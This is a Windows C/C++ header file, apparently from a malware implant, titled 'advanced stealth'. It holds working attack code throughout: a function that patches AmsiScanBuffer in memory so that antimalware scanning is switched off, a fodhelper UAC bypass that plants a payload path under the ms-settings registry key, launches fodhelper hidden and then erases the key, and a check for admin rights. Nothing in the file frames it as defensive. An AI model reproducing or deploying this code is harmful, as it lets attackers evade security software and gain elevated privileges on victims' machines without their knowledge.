#ifndef ADVANCED_STEALTH_H
#define ADVANCED_STEALTH_H

#include <windows.h>
#include <string>
#include "api_hashes.h"

// --- AMSI Bypass (Native) ---

typedef struct _AMSI_API {
    ULONG_PTR NtProtectVirtualMemory;
    ULONG_PTR NtWriteVirtualMemory;
} AMSI_API;

static BOOL BypassAMSI(API_TABLE* api) {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    // x64 patch for AmsiScanBuffer: amsi.dll!AmsiScanBuffer
    // b8 57 00 07 80 (mov eax, 0x80070057) - E_INVALIDARG
    // c3             (ret)
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    PVOID baseAddr = pAmsiScanBuffer;

    // Use indirect/hased API for protection change
    if (((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
        GetCurrentProcess(), &baseAddr, &patchSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
        
        memcpy(pAmsiScanBuffer, patch, sizeof(patch));

        ((NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->NtProtectVirtualMemory)(
            GetCurrentProcess(), &baseAddr, &patchSize, oldProtect, &oldProtect);
        
        return TRUE;
    }

    return FALSE;
}

// --- UAC Bypass (fodhelper technique) ---

static BOOL BypassUAC(const wchar_t* payloadPath) {
    HKEY hKey;
    LPCWSTR registryPath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    
    // 1. Create registry structure
    if (RegCreateKeyExW(HKEY_CURRENT_USER, registryPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return FALSE;
    }

    // 2. Set the payload as the command
    RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)payloadPath, (DWORD)(wcslen(payloadPath) + 1) * sizeof(wchar_t));
    
    // 3. Set DelegateExecute to empty string (required for the bypass)
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", sizeof(wchar_t));
    
    RegCloseKey(hKey);

    // 4. Trigger via fodhelper
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"open";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExW(&sei)) {
        // 5. Cleanup (short delay needed for fodhelper to read the key)
        Sleep(2000);
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
        return TRUE;
    }

    return FALSE;
}

// --- Check Privilege ---

static BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
    }
    if (hToken) CloseHandle(hToken);
    return isAdmin;
}

#endif // ADVANCED_STEALTH_H
